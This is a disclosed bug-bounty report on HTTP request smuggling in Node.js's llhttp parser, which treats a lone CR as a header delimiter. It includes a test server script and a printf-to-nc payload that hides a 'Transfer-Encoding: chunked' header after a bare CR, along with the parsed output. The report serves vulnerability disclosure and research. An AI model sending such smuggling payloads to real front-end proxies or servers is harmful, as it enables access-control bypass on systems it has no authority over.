# HTTP Request Smuggling via Empty headers separated by CR

## Report Details
- **Report ID**: 2032842
- **URL**: https://hackerone.com/reports/2032842
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-06-21T02:33:13.723Z
- **Disclosed**: 2023-08-28T14:53:27.090Z

## Reporter
- **Username**: yadhukrishnam
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
This report was originally submitted here: https://hackerone.com/reports/2001873

---


**Summary:** 
The `llhttp` parser in the http module in Node v20.2.0 does not strictly use the CRLF sequence to delimit HTTP requests. This can lead to HTTP Request Smuggling (HRS).

**Description:** 
The CR character (without LF) is sufficient to delimit HTTP header fields in the llhttp parser. According to RFC7230 section 3, only the CRLF sequence should delimit each header-field.

## Steps To Reproduce:

*Server:*
```javascript
const http = require("http");
http
  .createServer((request, response) => {
    let body = [];
    request
      .on("error", (err) => {
        response.end("Request Error: " + err);
      })
      .on("data", (chunk) => {
        body.push(chunk);
      })
      .on("end", () => {
        body = Buffer.concat(body).toString();
        // log the body to stdout to catch the smuggled request
        console.log("Response");
        console.log(request.headers);
        console.log(body);
        console.log("---");
        response.on("error", (err) => {
          // log the body to stdout to catch the smuggled request
          response.end("Response Error: " + err);
        });
        response.end(
          "Body length: " + body.length.toString() + " Body: " + body
        );
      });
  })
  .listen(5000);
```
*Payload:*
1. Execute the below command.
```shell
printf "POST / HTTP/1.1\r\n"\
             "Host: localhost:5000\r\n"\
             "X-Abc:\rxTransfer-Encoding: chunked\r\n"\
             "\r\n"\
             "1\r\n"\
             "A\r\n"\
             "0\r\n"\
             "\r\n" | nc localhost 5000
```
2. Note that the value of `X-Abc` header in the request is - `[\r]xTransfer-Encoding: chunked[\r\n]`
3. The llhttp library parses this as a `Transfer-Encoding: chunked` header.
```
Response
{ host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' }
A
---
```
*Note:*
1. The next character to `\r` is missing in the parsed header name.
2.  This test case is missing from https://github.com/nodejs/llhttp/blob/main/test/request/invalid.md.
A frontend proxy that does not consider `\r` as termination of an HTTP header value, could forward this to a backend, causing an HRS. 

## Supporting Material/References:
This report is similar to:
  * https://hackerone.com/reports/1888760

## Impact

HTTP Request Smuggling can lead to Access Control Bypass

## Attachments
No attachments
